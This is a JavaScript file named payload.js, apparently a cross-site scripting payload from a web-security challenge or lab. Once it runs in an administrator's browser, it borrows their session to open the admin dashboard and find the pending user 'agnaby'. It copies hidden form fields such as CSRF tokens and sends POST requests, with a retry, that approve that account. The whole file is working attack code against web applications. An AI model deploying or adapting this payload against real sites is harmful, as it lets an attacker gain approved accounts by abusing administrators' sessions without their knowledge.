// payload.js
// Fetch admin dashboard, find the pending user "agnaby", extract their id from
// form action "/admin/approve/<id>" and send POST to approve them.
//
// Requirements: this file is loaded from jsDelivr on the victim page, and the
// browser has the user's session cookies (credentials: 'same-origin').

(async () => {
  const TARGET_USERNAME = 'agnaby';

  function log(...args) { console.log('[payload]', ...args); }

  try {
    // 1) GET the admin dashboard
    const getRes = await fetch('/admin/dashboard', { credentials: 'same-origin' });
    if (!getRes.ok) {
      alert('GET /admin/dashboard returned ' + getRes.status);
      log('GET failed', getRes.status, await getRes.text().catch(()=>'')); 
      return;
    }
    const html = await getRes.text();
    log('fetched /admin/dashboard');

    // 2) parse HTML into DOM
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    // 3) find forms with actions like /admin/approve/<id>
    const forms = Array.from(doc.querySelectorAll('form[action^="/admin/approve/"]'));
    log('found approve-forms count:', forms.length);

    // 4) try to match the form belonging to TARGET_USERNAME
    let targetForm = null;
    let targetAction = null;
    for (const f of forms) {
      // check nearby text (parent li, or previousSibling text)
      const container = f.closest('li') || f.parentElement || f;
      const text = (container && container.textContent) ? container.textContent.trim() : '';
      if (text.includes(TARGET_USERNAME)) {
        targetForm = f;
        targetAction = f.getAttribute('action');
        break;
      }
    }

    // fallback: check list items that contain username and a form child
    if (!targetForm) {
      const listItems = Array.from(doc.querySelectorAll('li'));
      for (const li of listItems) {
        if ((li.textContent || '').includes(TARGET_USERNAME)) {
          const f = li.querySelector('form[action^="/admin/approve/"]');
          if (f) {
            targetForm = f;
            targetAction = f.getAttribute('action');
            break;
          }
        }
      }
    }

    if (!targetForm || !targetAction) {
      alert('Could not find pending user "' + TARGET_USERNAME + '" on /admin/dashboard');
      log('no target form found; page snapshot:', html);
      return;
    }

    log('target action:', targetAction);

    // 5) extract userId from action (e.g., /admin/approve/123)
    const m = targetAction.match(/\/admin\/approve\/([^\/?#]+)/);
    if (!m) {
      alert('Could not extract user id from action: ' + targetAction);
      log('action parse fail', targetAction);
      return;
    }
    const userId = m[1];
    log('extracted userId:', userId);

    // 6) collect possible hidden inputs inside the form (CSRF token etc.)
    const hiddenInputs = {};
    Array.from(targetForm.querySelectorAll('input[type="hidden"], input:not([type])')).forEach(inp => {
      const name = inp.getAttribute('name');
      if (name) hiddenInputs[name] = inp.getAttribute('value') || '';
    });
    log('hidden inputs found in form (may include CSRF):', hiddenInputs);

    // 7) prepare POST body
    // If the form has its own fields (e.g., status), we try to replicate them.
    // Common case: form might only have submit button and server infers approve from route.
    const formData = new URLSearchParams();
    // include hidden inputs
    for (const k in hiddenInputs) formData.append(k, hiddenInputs[k]);

    // If server expects some known fields, try adding them (safe-guess)
    // (uncomment/edit if needed)
    // formData.append('status', 'approved');
    // formData.append('id', userId);

    // 8) send POST to the action URL (relative to site root)
    const postUrl = targetAction; // already like /admin/approve/<id>
    const postRes = await fetch(postUrl, {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData.toString()
    });

    if (postRes.ok) {
      alert('Approve POST likely succeeded for user ' + TARGET_USERNAME + ' (id=' + userId + ')');
      log('POST success', postRes.status, await postRes.text().catch(()=>''));
    } else {
      // if 403/401 - possible CSRF or permission problem. Try including a fake submit param
      const fallbackData = new URLSearchParams(formData);
      // try adding typical submit name/value
      fallbackData.append('submit', 'Approve');
      const retry = await fetch(postUrl, {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: fallbackData.toString()
      });
      if (retry.ok) {
        alert('Fallback POST succeeded for user ' + TARGET_USERNAME + ' (id=' + userId + ')');
        log('fallback POST success', retry.status, await retry.text().catch(()=>''));
      } else {
        alert('Approve POST failed: ' + postRes.status + '. Check console for details.');
        log('POST failed', postRes.status, await postRes.text().catch(()=>''));
      }
    }
  } catch (err) {
    console.error('[payload] error', err);
    alert('Payload error (see console)');
  }
})();
